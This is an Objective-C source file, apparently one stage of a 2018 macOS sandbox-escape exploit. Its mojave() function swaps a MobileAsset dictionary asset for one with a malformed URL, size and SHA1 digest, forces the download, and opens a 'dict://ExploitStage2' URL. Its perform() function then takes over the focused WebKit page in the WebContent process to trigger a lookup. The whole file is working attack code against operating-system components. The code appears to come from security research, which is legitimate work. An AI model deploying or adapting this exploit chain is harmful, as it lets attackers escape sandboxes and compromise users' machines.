//
//  mobileasset.m
//  sbesc
//
//  Created by codecolorist on 2018/12/3.
//  Copyright Â© 2018 AntFinancial. All rights reserved.
//

#include <dlfcn.h>

#include "../../utils/config.gen.h"
#import "../../utils/DictAssets.h"

#import "exploit.h"
#import "WebCoreApi.h"

#define LOG(format, ...) NSLog(@"[exploit] "format, ## __VA_ARGS__)

void mojave() {
    FakeAsset *asset = [DictAssets find];
    assert(asset);
#if 1
    asset.source = @DICTIONARY_URL;
    NSDictionary *malformed = @{
                                @"_DownloadSize": @DOWNLOAD_SIZE,
                                @"_UnarchivedSize": @UNARCHIVED_SIZE,
                                @"_Measurement": [NSData dataWithBytes:SHA1_DIGEST_BYTES length:20]
                                };                
    [asset update:malformed];

#else
    asset.source = @ORIGINAL_DICTIONARY_URL;
    NSDictionary *original = @{
                                @"_DownloadSize": @ORIGINAL_DOWNLOAD_SIZE,
                                @"_UnarchivedSize": @ORIGINAL_UNARCHIVED_SIZE,
                                @"_Measurement": [NSData dataWithBytes:ORIGINAL_SHA1_DIGEST_BYTES length:20]
                                };
    [asset update:original];
#endif

    [asset downloadBlocking];

    NSString *identifier = [[NSBundle mainBundle] bundleIdentifier];
    if (![identifier isEqualToString:@"com.apple.WebKit.WebContent"]) {
        LOG("to debug this, attach me to WebContent process");
        NSURL *url = [NSURL URLWithString:@"dict://ExploitStage2"];
        [[NSWorkspace sharedWorkspace] openURL:url];
        return;
    }

    LOG("Ah ah ah ah");
    LOG("Set the cheetahs on the loose");
    LOG("There's a thief out on the move");

    perform();
}

void perform() {
    WebKitApi *api = getWebKitApi();
    void *process = api->getWebProcess();
    void *page = api->getFocusedPage(process);
    LOG("WebPage @%p", page);
    if (page) {
        LOG("before dispatch");
        dispatch_async(dispatch_get_main_queue(), ^{
            LOG(@"go");
            api->performLookup(page);
            LOG(@"dispatched");
        });
        LOG("after dispatch");
        return;
    }
    LOG("page not found, impossible");
}
